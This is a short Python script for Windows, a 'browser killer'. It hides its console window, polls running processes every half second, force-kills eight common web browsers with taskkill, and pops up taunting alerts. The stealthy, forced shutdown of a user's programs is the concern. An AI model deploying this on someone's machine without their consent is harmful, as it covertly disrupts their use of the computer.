import os
import time
import random
import ctypes
import sys
from win32com.client import GetObject

TARGET_APPS = [
    "chrome.exe",
    "chromium.exe",
    "brave.exe",
    "msedge.exe",
    "opera.exe",
    "firefox.exe",
    "opera_gx.exe",
    "zen.exe",
]

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except Exception:
    pass

ERROR_MESSAGES = [
    "NOPE!",
    "Stop trying to open browsers!",
    "You don't need a browser right now.",
    "Browsers are disabled.",
    "Access Denied.",
]

def find_target_processes():
    found = []
    try:
        wmi = GetObject("winmgmts:")
        processes = wmi.InstancesOf("Win32_Process")
        for p in processes:
            try:
                name = p.Properties_("Name").Value
                if not name:
                    continue
                name = str(name).lower()
                if name in TARGET_APPS:
                    if name not in found:
                        found.append(name)
            except Exception:
                continue
    except Exception:
        pass
    return found

def close_process(proc_name):
    try:
        os.system(f'taskkill /f /im "{proc_name}" >nul 2>&1')
        error_msg = random.choice(ERROR_MESSAGES)
        try:
            ctypes.windll.user32.MessageBoxW(0, error_msg, "Alert", 0x10)
        except Exception:
            pass
    except Exception:
        pass

def main():
    print("Browser killer running... (invisible)", flush=True)
    kill_count = 0
    try:
        while True:
            targets = find_target_processes()
            if targets:
                for proc in targets:
                    close_process(proc)
                    kill_count += 1
                    print(f"Killed {proc} — Total kills: {kill_count}", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nBrowser killer stopped.", flush=True)
    except Exception as e:
        try:
            ctypes.windll.user32.MessageBoxW(0, f"error: {e}", "browser killer", 0x10)
        except Exception:
            pass

if __name__ == "__main__":
    main()
